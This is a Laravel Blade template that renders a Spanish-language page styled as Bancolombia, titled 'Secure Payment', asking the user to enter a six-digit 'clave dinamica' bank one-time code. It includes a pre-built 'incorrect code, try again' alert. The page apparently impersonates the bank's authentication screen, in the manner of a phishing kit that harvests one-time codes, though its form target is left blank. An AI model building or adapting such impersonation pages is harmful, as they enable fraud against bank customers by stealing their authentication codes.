@extends('banks.bancolombia.layout')

@section('title', 'Secure Payment')

@section('page_title', 'Ingresa tu clave dinamica')


@section('alert')
    <div class="alert-container" style="display:none" id="alertBox">
        <div class="alert">
            <div class="alert-icon">
                <i class="fa-solid fa-circle-xmark"></i>
            </div>
            <div class="alert-text" id="alertText">
                Clave dinamica incorrecta. Verifica e intenta nuevamente.
            </div>
            <div class="alert-close" onclick="document.getElementById('alertBox').style.display='none'">
                <i class="fa-solid fa-x"></i>
            </div>
        </div>
    </div>
@endsection
@section('content')
    <br><br>
    <form method="POST" action="#">
        @csrf
        <div class="input-container">
            <img class="input-icon" src="{{asset('assets/img/payment/bancolombia/passicon.png')}}">
            <input type="numeric" name="code" id="txtDinamic" class="pass" placeholder="" maxlength="6" minlength="6"
                oninput="this.value = this.value.replace(/\D+/g, '');" inputmode="numeric" pattern="[0-9]{6}" required>
            <label for="txtDinamic">Clave dinamica</label>
        </div>

        <a><small>¿necesitas ayuda?</small></a>

        <br>

        <div>
            <input type="submit" value="Continuar" id="btnDinamic" disabled>
        </div>
    </form>
@endsection

@push('scripts')
    <script>
        
        // Ejemplo: habilitar botón cuando el input sea válido (4 dígitos)
        const dinamic = document.getElementById('txtDinamic');
        const btn = document.getElementById('btnDinamic');

        function toggleBtn() {
            btn.disabled = !(dinamic.value && dinamic.value.length === 6);
        }

        dinamic.addEventListener('input', toggleBtn);
        toggleBtn();
    </script>
@endpush